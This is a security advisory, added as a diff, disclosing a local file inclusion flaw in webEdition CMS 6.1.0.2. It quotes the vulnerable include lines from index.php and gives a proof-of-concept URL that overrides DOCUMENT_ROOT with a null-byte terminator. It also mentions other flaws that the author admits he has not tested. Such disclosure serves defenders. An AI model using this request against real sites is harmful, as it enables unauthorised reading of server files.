@@ -1,0 +1,78 @@
+===================================================================
+    webEdition CMS (DOCUMENT_ROOT) Local File Inclusion vulnerability
+===================================================================
+   
+Software:   webEdition CMS (6.1.0.2)
+Vendor:     http://www.webedition.org
+Vuln Type:  Local File Inclusion
+Download link:  http://sourceforge.net/projects/webedition/files/webEdition/6.1.0.2/webEdition_6102.tar.gz/download
+Author:     eidelweiss
+contact:    eidelweiss[at]windowslive[dot]com
+Home:       www.eidelweiss.info
+
+Gratz: wellcome back YOGYACARDERLINK.web.id !!!
+   
+References: http://eidelweiss-advisories.blogspot.com/2011/03/webedition-cms-version-6102.html
+   
+   
+===================================================================
+ 
+    description:
+webEdition Version 6.1.0.2
+
+webEdition is a web content management system licensed under the GPL
+For system requirements,
+installation and upgrade details, see the files INSTALL and the informations available on our website
+
+ http://www.webedition.org
+
+see webEdition/license folder for license informations
+see INSTALL for quick installation instructions.
+----------------------------------
+    Vulnerability code:
+ 
+index.php
+
+/*****************************************************************************
+ * INITIALIZATION
+ *****************************************************************************/
+
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/conf/we_conf.inc.php");
+require_once($_SERVER['DOCUMENT_ROOT'] . "/webEdition/we/include/we_message_reporting/we_message_reporting.class.php");
+
+/*****************************************************************************
+ * INCLUDES
+ *****************************************************************************/
+
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_html_tools.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_browser_check.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_classes/html/we_button.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_classes/html/we_htmlElement.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_classes/html/we_htmlTable.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_language/".$GLOBALS["WE_LANGUAGE"]."/start.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_language/".$GLOBALS["WE_LANGUAGE"]."/alert.inc.php");
+include_once($_SERVER["DOCUMENT_ROOT"]."/webEdition/we/include/we_language/".$GLOBALS["WE_LANGUAGE"]."/global.inc.php");
+
+$ignore_browser = isset($_REQUEST["ignore_browser"]) &&  ($_REQUEST["ignore_browser"] === "true");
+
+/*****************************************************************************
+
+ 
+----------------------------------
+ 
+    exploit & p0c
+   
+[!] http://host/webEdition/index.php?DOCUMENT_ROOT= [lfi]%00
+    or
+[!] http://host/path_to_webEdition/index.php?DOCUMENT_ROOT= [lfi]%00
+ 
+Nb: seems Another vulnerability also available like LFD , XSS , RFI maybe and etc , but i didnt check and test yet.
+   
+====================================================================
+   
+    Nothing Impossible In This World Even Nobody`s Perfect
+   
+===================================================================
+   
+==========================| -=[ E0F ]=- |==========================
